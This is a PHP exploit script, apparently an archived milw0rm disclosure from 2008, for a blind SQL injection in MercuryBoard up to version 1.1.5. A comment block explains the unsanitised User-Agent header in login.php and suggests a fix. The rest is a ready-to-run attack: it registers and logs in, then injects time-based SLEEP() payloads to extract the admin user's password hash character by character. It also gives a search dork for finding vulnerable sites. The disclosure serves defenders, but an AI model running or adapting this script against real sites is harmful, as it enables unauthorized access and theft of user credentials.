<?php

/*
	--------------------------------------------------------------------
	MercuryBoard <= 1.1.5 (login.php) Remote Blind SQL Injection Exploit
	--------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.mercuryboard.com/
	dork.....: "Powered by MercuryBoard"
	details..: SLEEP() function was added in MySQL 5.0.12, so this PoC works depending on the version of MySQL

	[-] do_login() function vulnerable to SQL injection in /func/login.php

	52.	function do_login()
	53.	{
	54.		$this->set_title($this->lang->login_header);
	55.		$this->tree($this->lang->login_header);
	56.		
	57.		//print "agent: $this->agent\n";
	58.	
	59.		if (!isset($this->post['submit'])) {
	60.			$request_uri = $this->get_uri();
	61.	
	62.			if (substr($request_uri, -8) == 'register') {
	63.				$request_uri = $this->self;
	64.			}
	65.	
	66.			return eval($this->template('LOGIN_MAIN'));
	67.		} else {
	68.			$username = str_replace('\\', '&#092;', $this->format(stripslashes($this->post['user']), FORMAT_HTMLCHARS | FORMAT_CENSOR));
	69.	
	70.			$data  = $this->db->fetch("SELECT user_id, user_password FROM {$this->pre}users WHERE REPLACE(LOWER(user_name), ' ', '')='" . str_replace(' ', '', strtolower($username)) . '\' AND user_id != ' . USER_GUEST_UID . ' LIMIT 1');
	71.			$pass  = $data['user_password'];
	72.			$user  = $data['user_id'];
	73.	
	74.			$this->post['pass'] = str_replace('$', '', $this->post['pass']);
	75.			$this->post['pass'] = md5($this->post['pass']);
	76.	
	77.			if ($this->post['pass'] == $pass) {
	78.				if (!setcookie($this->sets['cookie_prefix'] . 'user', $user, $this->time + $this->sets['logintime'], $this->sets['cookie_path'])
	79.				||  !setcookie($this->sets['cookie_prefix'] . 'pass', $pass, $this->time + $this->sets['logintime'], $this->sets['cookie_path'])) {
	80.					return $this->message($this->lang->login_header, $this->lang->login_cookies);
	81.				}
	82.	
	83.				// Delete guest entry
	84.				$this->db->query("DELETE FROM {$this->pre}active WHERE active_ip='$this->ip' AND active_user_agent='$this->agent'"); <=======
	85.	
	86.				return $this->message($this->lang->login_header, $this->lang->login_logged, $this->lang->main_continue, str_replace('&', '&amp;', $this->post['request_uri']), $this->post['request_uri']);

	$this->agent (User-Agent header) isn't properly sanitised, so an attacker could be inject arbitrary SQL code in a subquery into the query at line 84
	
	[-] Possible bug fix in /global.php
	
	66.	function mercuryboard()
	67.	{
	68.		$this->time    = time();
	69.		$this->query   = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : null;
	70.		$this->ip      = $_SERVER['REMOTE_ADDR'];
	71.		$this->agent   = isset($_SERVER['HTTP_USER_AGENT']) ? addslashes($_SERVER['HTTP_USER_AGENT']) : null; <=======
	72.		$this->self    = $_SERVER['PHP_SELF'];
	73.		$this->server  = $_SERVER;
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function getmicrotime()
{ 
	list($usec, $sec) = explode(" ", microtime()); 
	return ((float)$usec + (float)$sec); 
}

function getdelay($query)
{
	global $host, $path, $username, $password;
	
	$data	= "user={$username}&pass={$password}&submit=1&request_uri=foo";
	$packet = "POST {$path}index.php?a=login HTTP/1.0\r\n";
	$packet.= "Host: {$host}\r\n";
	$packet.= "User-Agent: {$query}\r\n";
	$packet.= "Content-Length: ".strlen($data)."\r\n";
	$packet.= "Content-Type: application/x-www-form-urlencoded\r\n";
	$packet.= "Connection: close\r\n\r\n";
	$packet.= $data;

	$start = getmicrotime()*1000;
	http_send($host, $packet);
	$end = getmicrotime()*1000;

	return ($end - $start);
}

function getusername($uid)
{
	global $host, $path;
	
	$packet = "GET {$path}index.php?a=profile&w={$uid} HTTP/1.0\r\n";
	$packet.= "Host: {$host}\r\n";
	$packet.= "Connection: close\r\n\r\n";
	preg_match("/Viewing Profile: (.*)<\/td>/i", http_send($host, $packet), $split);

	return $split[1];
}

function register()
{
	global $host, $path, $username, $password;
	
	$data	= "desuser={$username}&email=foo@null.com&passA={$password}&passB={$password}&submit=1";
	$packet = "POST {$path}index.php?a=register HTTP/1.0\r\n";
	$packet.= "Host: {$host}\r\n";
	$packet.= "Content-Length: ".strlen($data)."\r\n";
	$packet.= "Content-Type: application/x-www-form-urlencoded\r\n";
	$packet.= "Connection: close\r\n\r\n";
	$packet.= $data;
	
	http_send($host, $packet);
}

function login()
{
	global $host, $path, $username, $password;
	
	$data	= "user={$username}&pass={$password}&submit=1&request_uri=foo";
	$packet = "POST {$path}index.php?a=login HTTP/1.0\r\n";
	$packet.= "Host: {$host}\r\n";
	$packet.= "Content-Length: ".strlen($data)."\r\n";
	$packet.= "Content-Type: application/x-www-form-urlencoded\r\n";
	$packet.= "Connection: close\r\n\r\n";
	$packet.= $data;
	
	$pattern = "/pass=".md5($password)."/";
	
	return preg_match($pattern, http_send($host, $packet));	
}

print "\n+------------------------------------------------------------------+";
print "\n| MercuryBoard <= 1.1.5 Remote Blind SQL Injection Exploit by EgiX |";
print "\n+------------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......:	php $argv[0] host path [options]\n";
	print "\nhost.......:	target server (ip/hostname)";
	print "\npath.......:	path to MercuryBoard directory (example: / or /mercury/)\n";
	print "\n-s seconds.:	number of seconds for SLEEP() (dafault: 5)";
	print "\n-u uid.....:	user id (default: 2 - admin)";
	print "\n-t prefix..:	table's prefix (default: mb)\n";
	print "\nExample....:	php $argv[0] localhost /mercury/ -s 1";
	print "\nExample....:	php $argv[0] localhost / -u 3 -t my_prefix\n";
	die();
}

$host	= $argv[1];
$path	= $argv[2];

$username = "pr00f_0f";
$password = "_c0nc3pt";

$opt	= array("-s", "-u", "-t");
$md5	= "";
$count	= "5";
$uid	= "2";
$prefix = "mb";

for ($i = 3; $i < $argc; $i++)
{
	if ($argv[$i] == "-s") if (isset($argv[$i+1]) && !in_array($argv[$i+1], $opt)) $count = $argv[++$i];
	if ($argv[$i] == "-u") if (isset($argv[$i+1]) && !in_array($argv[$i+1], $opt)) $uid = $argv[++$i];
	if ($argv[$i] == "-t") if (isset($argv[$i+1]) && !in_array($argv[$i+1], $opt)) $prefix = $argv[++$i];	
}

if (!login())
{
	print "\n[-] Trying to register with username '{$username}' and password '{$password}'\n";
	register();
	if (!login()) die("\n[-] Login failed!\n");
}

$user = getusername($uid);
print "\n[-] Username: {$user}";

$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
$index = 1; $md5 = "";
print "\n[-] MD5 Hash: ";
	
while (!strpos($md5, chr(0)))
{
	for ($i = 0, $n = count($hash); $i <= $n; $i++)
	{
		if ($i == $n) die("\n\n[-] Exploit failed...\n");
		$sql = "'OR(SELECT IF(ORD(SUBSTR(user_password,{$index},1))={$hash[$i]},SLEEP({$count}),1) FROM {$prefix}_users WHERE user_id={$uid})#";
		if (getdelay($sql) >= ($count * 1000)) { $md5 .= chr($hash[$i]); print chr($hash[$i]); break; }
	}
	
	$index++;
}

if (!eregi("[0-9,a-f]{32}", $md5)) print "\n\n[-] Invalid MD5 hash...\n";
else print "\n\n[-] Successfull!\n";
	
?>

# milw0rm.com [2008-05-19]
